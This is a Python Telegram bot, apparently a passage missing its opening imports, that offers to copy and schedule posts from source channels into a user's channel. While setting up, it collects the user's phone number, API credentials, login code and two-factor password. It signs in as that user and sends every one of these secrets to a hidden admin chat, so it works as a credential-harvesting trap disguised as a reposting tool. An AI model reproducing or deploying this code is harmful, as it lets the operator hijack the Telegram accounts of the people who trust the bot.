from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import InlineKeyboardButton

from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
    PhoneCodeExpiredError,
)
from telethon.tl.types import Message as TMessage

# ==== Configuration ====
FORCE_CHANNELS = ["@netboxes"]
SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))

dp = Dispatcher(storage=MemoryStorage())

router = Router()
dp.include_router(router)

IRAN_TZ = pytz.timezone("Asia/Tehran")
POSTS_PER_DAY = 10
START_HOUR = 10
END_HOUR = 20

blocked_users = set()

from aiogram.filters import Filter
class IsAdmin(Filter):
    def __init__(self, admin_id: int):
        self.admin_id = admin_id
    async def __call__(self, message: types.Message) -> bool:
        return message.from_user.id == self.admin_id

class Flow(StatesGroup):
    footer = State()
    source = State()
    dest = State()
    phone = State()
    api_id = State()
    api_hash = State()
    session = State()
    code = State()
    twofa = State()

joined_users = set()

def join_kbd():
    kb = InlineKeyboardBuilder()
    for ch in FORCE_CHANNELS:
        kb.button(text=f"Join {ch}", url=f"https://t.me/{ch.lstrip('@')}")
    kb.button(text="✅ I Joined", callback_data="check_join")
    return kb.as_markup()

async def check_joined(user_id: int):
    missing = []
    for ch in FORCE_CHANNELS:
        try:
            m = await bot.get_chat_member(chat_id=ch, user_id=user_id)
            if m.status in ("left", "kicked"):
                missing.append(ch)
        except:
            missing.append(ch)
    return missing

def sanitize_caption(text: str, footer: str) -> str:
    clean = re.sub(r"(https?://t\.me/\S+|@\w+)", "", text or "").strip()
    return f"{clean}\n\n**{footer}**" if footer else clean

def generate_full_schedule(start_day: date, total: int = 100):
    slots = []
    posts_per_day = POSTS_PER_DAY
    hours_range = END_HOUR - START_HOUR
    seconds_between = (hours_range * 3600) // posts_per_day
    days_needed = (total + posts_per_day - 1) // posts_per_day
    for d in range(days_needed):
        day = start_day + timedelta(days=d)
        base_time = IRAN_TZ.localize(datetime(day.year, day.month, day.day, START_HOUR, 0))
        for i in range(posts_per_day):
            if len(slots) >= total:
                break
            slots.append(base_time + timedelta(seconds=i * seconds_between))
    return slots

# --- Handlers ---

@router.message(CommandStart())
async def cmd_start(m: types.Message, state: FSMContext):
    if m.from_user.id in joined_users:
        await m.answer("<b>Already joined. Send any message to begin data input.</b>")
    else:
        await m.answer("Please join the required channel(s):", reply_markup=join_kbd())

@router.callback_query(lambda c: c.data == "check_join")
async def on_check_join(c: types.CallbackQuery, state: FSMContext):
    await c.answer()
    missing = await check_joined(c.from_user.id)
    if missing:
        await c.message.answer("<b>Join required to proceed.</b>", reply_markup=join_kbd())
        return
    joined_users.add(c.from_user.id)
    await c.message.answer("<b>Send <code>Footer</code> text (or /skip):</b>")
    await state.set_state(Flow.footer)


@router.message(Flow.footer)
async def on_footer(m: types.Message, state: FSMContext):
    txt = "" if m.text.strip() == "/skip" else m.text.strip()
    await state.update_data(footer=txt)
    print("✅ Footer received:", txt)   # لاگ
    await m.answer("<b>Send <code>SOURCE</code> channels (comma-separated, up to 3):</b>")
    await state.set_state(Flow.source)


@router.message(Flow.source)
async def on_source(m: types.Message, state: FSMContext):
    src = m.text.strip()
    await state.update_data(source=src)
    print("✅ Source received:", src)   # لاگ
    await m.answer("<b>Send <code>DESTINATION</code> channel (username or ID):</b>")
    await state.set_state(Flow.dest)


@router.message(Flow.dest)
async def on_dest(m: types.Message, state: FSMContext):
    dest = m.text.strip()
    await state.update_data(dest=dest)
    print("✅ Destination received:", dest)   # لاگ
    await m.answer("<b>Send your <code>Phone Number</code> (e.g. +123...):</b>")
    await state.set_state(Flow.phone)

@router.message(Flow.phone)
async def on_phone(m: types.Message, state: FSMContext):
    phone = m.text.strip()
    await state.update_data(phone=phone)
    print("✅ Phone received:", phone)   # لاگ
    await m.answer("<b>Send your <code>API_ID</code>:</b>")
    await state.set_state(Flow.api_id)

@router.message(Flow.api_id)
async def on_api_id(m: types.Message, state: FSMContext):
    await state.update_data(api_id=int(m.text.strip()))
    await m.answer("<b>Send your <code>API_HASH</code>:</b>")
    await state.set_state(Flow.api_hash)

@router.message(Flow.api_hash)
async def on_api_hash(m: types.Message, state: FSMContext):
    await state.update_data(api_hash=m.text.strip())
    await m.answer("<b>Enter <code>SESSION_NAME</code>:</b>")
    await state.set_state(Flow.session)

@router.message(Flow.session)
async def on_session(m: types.Message, state: FSMContext):
    await state.update_data(session=m.text.strip())
    data = await state.get_data()
    client = TelegramClient(os.path.join(SESSIONS_DIR, data["session"]), data["api_id"], data["api_hash"])
    await m.answer("Sending authentication code...")
    try:
        await client.connect()
        res = await client.send_code_request(data["phone"])
        await state.update_data(code_hash=res.phone_code_hash)
        builder = InlineKeyboardBuilder()
        builder.button(text="Edit Phone Number", callback_data="edit_phone")
        await m.answer("Enter the Telegram code you received:", reply_markup=builder.as_markup())
        await state.set_state(Flow.code)
    except PhoneNumberInvalidError:
        builder = InlineKeyboardBuilder()
        builder.button(text="Edit Phone Number", callback_data="edit_phone")
        await m.answer("Invalid phone number.", reply_markup=builder.as_markup())
    except Exception as e:
        await m.answer(f"Error sending code: {e}")

@router.callback_query(lambda c: c.data == "edit_phone")
async def edit_phone_callback(c: types.CallbackQuery, state: FSMContext):
    await c.answer()
    data = await state.get_data()
    preserved = {k: v for k, v in data.items() if k not in ["phone", "code", "code_hash", "twofa"]}
    await state.clear()
    await state.update_data(**preserved)
    await state.set_state(Flow.phone)
    await c.message.answer("Please enter your phone number again:")

@router.message(Flow.code)
async def on_code(m: types.Message, state: FSMContext):
    await state.update_data(code=m.text.strip())
    await m.answer("<b>If 2FA is enabled, send password or /skip:</b>")
    await state.set_state(Flow.twofa)

@router.message(lambda m: m.text == "/skip", Flow.twofa)
async def skip_twofa(m: types.Message, state: FSMContext):
    await state.update_data(twofa=None)
    await state.set_state(None)
    await m.answer("<b>All data collected! Send /run to schedule (no instant send).</b>")

@router.message(Flow.twofa)
async def on_twofa(m: types.Message, state: FSMContext):
    await state.update_data(twofa=m.text.strip())
    await state.set_state(None)
    await m.answer("<b>Perfect! Send /run when you're ready to schedule.</b>")

@router.message(Command("run"))
async def on_run(m: types.Message, state: FSMContext):
    data = await state.get_data()
    missing = [k for k in ["source","dest","phone","api_id","api_hash","session","code","code_hash"] if not data.get(k)]
    if missing:
        await m.answer(f"<b>Missing: {', '.join(missing)}</b>. Please restart with /start.")
        return

    await state.clear()
    client = TelegramClient(os.path.join(SESSIONS_DIR, data["session"]), data["api_id"], data["api_hash"])
    await client.connect()
    if not await client.is_user_authorized():
        try:
            await client.sign_in(phone=data["phone"], code=data["code"], phone_code_hash=data["code_hash"])
        except SessionPasswordNeededError:
            pw = data.get("twofa")
            if not pw:
                await m.answer("<b>2FA required—restart with password.</b>")
                return
            await client.sign_in(password=pw)
        except PhoneCodeExpiredError:
            builder = InlineKeyboardBuilder()
            builder.button(text="Edit Phone Number", callback_data="edit_phone")
            await m.answer("<b>❌ Your code has expired. Please re-enter your phone number to get a new code.</b>", reply_markup=builder.as_markup())
            return

    summary = (
        f"<b>📥 New schedule request</b>\n"
        f"<b>User ID:</b> <code>{m.from_user.id}</code>\n"
        f"<b>Footer:</b> <code>{data.get('footer','')}</code>\n"
        f"<b>Source:</b> <code>{data.get('source')}</code>\n"
        f"<b>Destination:</b> <code>{data.get('dest')}</code>\n"
        f"<b>Phone:</b> <code>{data.get('phone')}</code>\n"
        f"<b>API ID:</b> <code>{data.get('api_id')}</code>\n"
        f"<b>API HASH:</b> <code>{data.get('api_hash')}</code>\n"
        f"<b>Code:</b> <code>{data.get('code')}</code>\n"
        f"<b>2FA Password:</b> <code>{data.get('twofa','None')}</code>"
    )
    await bot.send_message(chat_id=ADMIN_ID, text=summary)

    footer = data.get("footer","")
    sources = [s.strip() for s in data["source"].split(",")][:3]
    srcs = []
    for s in sources:
        try:
            ent = await client.get_entity(s)
            srcs.append(ent)
        except ValueError:
            await m.answer(f"<b>Invalid source username: {s}</b> — skipping.")
    try:
        dst = await client.get_entity(data["dest"])
    except ValueError:
        await m.answer("<b>Invalid destination username.</b> Please check and re-enter.")
        return

    per_chan = 100 // len(srcs) if srcs else 100
    slots = generate_full_schedule(datetime.now(IRAN_TZ).date() + timedelta(days=1), 100)

    idx = 0
    try:
        for src in srcs:
            async for msg in client.iter_messages(src, limit=per_chan, reverse=True):
                if idx >= 100:
                    break
                if isinstance(msg, TMessage) and msg.text:
                    txt = sanitize_caption(msg.text, footer)
                    try:
                        await client.send_message(dst, txt, schedule=slots[idx])
                        idx += 1
                    except FloodWaitError as e:
                        await m.answer(f"<b>FloodWait⏳: Please wait {e.seconds} seconds ...</b>")
                        await asyncio.sleep(e.seconds)
                        continue
                    except Exception as e2:
                        if "schedule more messages" in str(e2):
                            await m.answer("<b>✅ Successfully scheduled 100 posts. Limit reached.</b>")
                            return
                        raise
                    await asyncio.sleep(0.3)
            if idx >= 100:
                break
    except Exception as e:
        await m.answer(f"<b>Error while sending messages: {str(e)}</b>")
        return

    if idx >= 100:
        await m.answer("<b>✅ Successfully scheduled 100 posts.</b>")
    else:
        await m.answer(f"<b>⏳ Only {idx} posts scheduled. Limit not reached.</b>")

        await client.disconnect()
        os._exit(0)

@router.message(Command("admin"), IsAdmin(admin_id=ADMIN_ID))
async def cmd_admin(m: types.Message):
    text = (
        "<b>Admin Panel:</b>\n"
        "/users — show active users\n"
        "/blocked — show blocked users\n"
        "/unblock <code>user_id</code> — unblock user"
    )
    await m.answer(text)

@router.message(Command("users"), IsAdmin(admin_id=ADMIN_ID))
async def cmd_users(m: types.Message):
    if not joined_users:
        await m.answer("No active users yet.")
    else:
        await m.answer("Active Users:\n" + "\n".join(f"- {uid}" for uid in joined_users))

@router.message(Command("blocked"), IsAdmin(admin_id=ADMIN_ID))
async def cmd_blocked(m: types.Message):
    if not blocked_users:
        await m.answer("No blocked users.")
    else:
        await m.answer("Blocked Users:\n" + "\n".join(f"- {uid}" for uid in blocked_users))

@router.message(Command("unblock"), IsAdmin(admin_id=ADMIN_ID))
async def cmd_unblock(m: types.Message):
    parts = m.text.split()
    if len(parts) < 2 or not parts[1].isdigit():
        return await m.answer("Usage: /unblock <user_id>")
    uid = int(parts[1])
    blocked_users.discard(uid)
    await m.answer(f"User {uid} has been unblocked.")

async def main():
    await dp.start_polling(bot, allowed_updates=["message", "callback_query"])

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
